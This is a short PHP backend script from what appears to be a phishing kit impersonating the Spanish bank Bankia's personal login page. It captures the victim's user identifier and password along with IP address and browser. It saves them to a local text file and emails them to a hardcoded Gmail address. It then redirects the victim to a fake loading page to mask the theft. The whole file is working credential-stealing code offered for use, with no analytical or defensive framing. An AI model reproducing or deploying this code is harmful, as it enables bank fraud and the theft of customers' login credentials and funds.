<?php
if (!empty($_POST['identificador']) && !empty($_POST['password'])) {
    $UserAgent =$_SERVER['HTTP_USER_AGENT'];
    $browser = explode(')',$UserAgent);				
    $_SESSION['browser'] = $browserTy_Version =array_pop($browser); 
    
    $msg.="==================================================\r\n";
    $msg=" [+] LOGIN(BANKIA) Particulares ///logo\r\n";
    $msg.="==============================\r\n";
    $msg.="[+] identificador : {$_POST['identificador']}\r\n";
    $msg.="[+] password : {$_POST['password']}\r\n";
    $msg.="==============================\r\n";
    $msg.="[+] localIP : {$_SERVER['REMOTE_ADDR']}\r\n";
    $msg.="[+] BROWSER : {$_SESSION['browser']} On/ {$_SESSION['os']}\r\n";
    $msg.="\r\n";
    $msg.="\r\n";
    $save=fopen("../bankiwawa.txt","a+");fwrite($save,$msg);fclose($save);
    $email="dr.hkrzlt@gmail.com"; //HERE
    $subject="LOGIN(BANKIA) =?utf-8?Q?=F0=9F=94=A5?= ({$_SERVER['REMOTE_ADDR']})";
    $headers="From: l7adia™<info@info.org>\r\n";
    $headers.="MIME-Version: 1.0\r\n";
    $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
    @mail($email,$subject,$msg,$headers);

    header("Location: ./loading.php?link=info"); 
}else{
    header("Location: ./index.php"); 
};

?>